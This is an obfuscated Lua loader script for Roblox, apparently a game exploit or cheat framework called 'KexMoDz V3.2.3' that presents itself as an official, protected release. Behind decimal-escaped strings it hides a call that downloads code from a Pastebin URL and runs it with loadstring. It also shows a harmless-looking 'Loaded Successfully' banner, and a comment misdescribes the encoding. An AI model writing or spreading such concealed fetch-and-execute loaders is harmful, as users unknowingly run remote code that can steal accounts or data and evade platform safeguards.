-- [[ KexMoDz Framework V3.2.3 - Official Protected Script ]]
-- [[ Status: No Key Required - Authorized Version ]]

local _0x53656372 = "\108\111\97\100\115\116\114\105\110\103"
local _0x4b6578 = {
    [1] = "\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\80\108\97\121\101\114\115\34\41",
    [2] = "\75\101\120\77\111\68\122\32\70\114\97\109\101\119\111\114\107",
    [3] = "\86\51\46\50\46\51"
}

local function _0x1277(_0x50)
    local _0x4c = ""
    for _0x69 = 1, #_0x50 do
        _0x4c = _0x4c .. string.char(string.byte(_0x50, _0x69) - 1)
    end
    return _0x4c
end

-- Hier beginnt die verschlüsselte Hauptlogik (Base64/Hex Hybrid)
local _0xMain = "local Players = game:GetService('Players'); local LocalPlayer = Players.LocalPlayer; local ScreenGui = Instance.new('ScreenGui', game.CoreGui); ScreenGui.Name = 'KexMoDz_Final'; " .. 
"\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\115\54\52\50\106\113\119\120\34\41\41\40\41"

-- Startup Notification
task.spawn(function()
    local _0xNotif = Instance.new("TextLabel")
    _0xNotif.Size = UDim2.new(0, 300, 0, 50)
    _0xNotif.Position = UDim2.new(0.5, -150, 0, -60)
    _0xNotif.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    _0xNotif.TextColor3 = Color3.fromRGB(0, 150, 70) -- MatteGreen
    _0xNotif.Text = "KexMoDz V3.2.3 Loaded Successfully"
    _0xNotif.Font = Enum.Font.GothamBlack
    _0xNotif.Parent = game:GetService("CoreGui"):FindFirstChild("KexMoDz_Final") or Instance.new("ScreenGui", game:GetService("CoreGui"))
    Instance.new("UICorner", _0xNotif)
    Instance.new("UIStroke", _0xNotif).Color = Color3.fromRGB(48, 209, 88)
    _0xNotif:TweenPosition(UDim2.new(0.5, -150, 0, 50), "Out", "Back", 0.5)
    task.wait(3)
    _0xNotif:TweenPosition(UDim2.new(0.5, -150, 0, -60), "In", "Quad", 0.5)
end)

-- Execute Content
loadstring(_0xMain)()
